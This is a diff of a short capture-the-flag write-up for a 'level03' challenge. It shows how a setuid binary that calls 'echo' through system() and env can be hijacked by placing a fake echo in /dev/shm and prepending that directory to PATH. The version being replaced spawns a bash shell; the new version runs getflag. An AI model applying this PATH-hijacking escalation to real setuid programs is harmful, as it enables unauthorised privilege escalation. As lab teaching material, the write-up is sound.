@@ -3,18 +3,27 @@ $> strings level03
 /usr/bin/env echo Exploit me
 ...
 $> nm -u level03
-         w _Jv_RegisterClasses
-         w __gmon_start__
-         U __libc_start_main@@GLIBC_2.0
+[...]
          U getegid@@GLIBC_2.0
          U geteuid@@GLIBC_2.0
          U setresgid@@GLIBC_2.0
          U setresuid@@GLIBC_2.0
          U system@@GLIBC_2.0
-$> # Let's add our echo binary which will create a shell for us
-$> # First let's create a echo binary somewhere we can write (In the shared memory for example)
-$> cd /dev/shm
-$> cat echo
-/bin/bash
-$> chmod +x echo
-$> cd ~ ; ./level03 # Enjoy your new shell
+[...]
+
+# Change UID during execution
+
+$> strings level03
+[...]
+/usr/bin/env echo %s
+[...]
+
+# Change `echo` binary to get the flag
+
+$> PATH=/dev/shm:$PATH
+
+$> echo "/bin/getflag" > /dev/shm/echo
+
+$> chmod +x /dev/shm/echo
+
+$> ./level03
